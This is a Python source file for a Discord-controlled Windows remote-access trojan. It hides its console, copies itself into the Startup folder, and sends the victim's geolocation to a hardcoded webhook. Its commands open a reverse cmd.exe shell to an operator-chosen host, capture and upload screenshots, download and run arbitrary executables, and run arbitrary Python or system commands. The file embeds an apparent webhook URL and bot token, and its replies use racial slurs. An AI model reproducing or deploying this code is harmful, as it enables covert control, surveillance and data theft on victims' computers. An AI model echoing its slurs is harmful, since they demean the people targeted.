import getpass, discord, os, time, requests, pyautogui, subprocess
from discord.ext import commands as cmds
import ctypes
import win32process
import os
import socket
from shutil import copy2
from win32com.shell import shell, shellcon
from threading import Thread

if os.name != 'nt': exit(0)

def startup_directory():
    return shell.SHGetFolderPath(0, shellcon.CSIDL_COMMON_STARTUP, 0, 0)

in_startup = os.getcwd().lower() == startup_directory().lower()

def HideMyAss():
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd != 0:
        ctypes.windll.user32.ShowWindow(hwnd, 0)
        ctypes.windll.kernel32.CloseHandle(hwnd)
        _, pid = win32process.GetWindowThreadProcessId(hwnd)

HideMyAss()

WEBHOOK_URL = "https://discord.com/api/webhooks/1063921532587474996/q8vbZvBzwzyXOkI_UIIS-5atl0gO7MoKym1I-mFZNdk9eCT9PRH2Jd1IAArfvudo_h5W"
TOKEN = "MTA1MzQ2NDg4MjU5MjM2NjY3Mw.GpHFBi.gDEZuMrMUL-ktYFqauk0p7Uf2vL6kYLUszX_6w"
USERNAME = getpass.getuser()

client: object = cmds.Bot(command_prefix="!", case_insensitive=False, intents=discord.Intents.all())

def tohook(msg):
    requests.post(
        url=WEBHOOK_URL,
        json={"content": msg}
    )

class Shelly:
    def __init__(self, host:str, port:int):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        self.host = host
        self.port = port
        self.s = s

        Thread(target=self._start_conn).start()

    def _start_conn(self):
        p = subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

        s2p_thread = Thread(target = self.s2p, args = [self.s, p])
        s2p_thread.daemon = True
        s2p_thread.start()

        p2s_thread = Thread(target = self.p2s, args = [self.s, p])
        p2s_thread.daemon = True
        p2s_thread.start()

        try: p.wait()
        except KeyboardInterrupt: self.s.close()

    def s2p(self, s,  p):
        while True:
            try:
                data = s.recv(1024)
                if len(data) > 0:
                    p.stdin.write(data)
                    p.stdin.flush()
            except: pass

    def p2s(self, s,  p):
        try:
            while True:
                s.send(p.stdout.read(1))
        except: pass


@client.command(pass_context=True)
async def shelly(ctx):
    await ctx.reply("[*] starting the shelly :smiling_imp:")

    _, host, port = ctx.message.content.split(' ')

    Shelly(host, int(port))

    await ctx.reply('[++++++] sponsored by the shelly. :white_check_mark:')

@client.event
async def on_ready():
    requests.post(
        url=WEBHOOK_URL,
        json={"content": f"@everyone {requests.get('https://geolocation-db.com/json').text}"}
    )

@client.command(pass_context=True)
async def ss(ctx):
    try:
        pyautogui.screenshot().save(f"{USERNAME}-ss.png")

        requests.post(
            url=WEBHOOK_URL,
            files={f"{USERNAME}-ss.png": open(f'{USERNAME}-ss.png', 'rb').read()}
        )

        os.system(f'del {USERNAME}-ss.png')

        await ctx.reply("i hate niggas")
    except:
        from traceback import format_exc
        await ctx.reply(f'Error\n```\n{format_exc()}\n```')

@client.command(pass_context=True)
async def upload(ctx):
    try:
        await ctx.reply("[*] beginning the download...")

        _, link = ctx.message.content.split(' ')

        with open("Temp-Data.exe", "wb") as f:
            f.write(requests.get(link).content)

        subprocess.run("Temp-Data.exe")

        await ctx.reply("ran nigga code fuck :person_skintone4:")
    except:
        from traceback import format_exc
        await ctx.reply(f'Error\n```\n{format_exc()}\n```')


@client.command(pass_context=True)
async def pyexec(ctx):
    try:
        _, code = ctx.message.content.split(' ', 1)
        exec(code)
    except:
        from traceback import format_exc
        await ctx.reply(f'Error\n```\n{format_exc()}\n```')

@client.command(pass_context=True)
async def pyexec_thread(ctx):
    try:
        _, code = ctx.message.content.split(' ', 1)
        Thread(target=exec, args=[code]).start()
    except:
        from traceback import format_exc
        await ctx.reply(f'Error\n```\n{format_exc()}\n```')


@client.command(pass_context=True)
async def os_system(ctx):
    try:
        _, code = ctx.message.content.split(' ', 1)
        os.system(code)
    except:
        from traceback import format_exc
        await ctx.reply(f'Error\n```\n{format_exc()}\n```')

@client.command(pass_context=True)
async def os_system_thread(ctx):
    try:
        _, code = ctx.message.content.split(' ', 1)
        Thread(target=os.system, args=[code]).start()
    except:
        from traceback import format_exc
        await ctx.reply(f'Error\n```\n{format_exc()}\n```')


if not in_startup:
    try:
        copy2(__file__, startup_directory())
    except:
        tohook('couldnt copy :(')

client.run(TOKEN)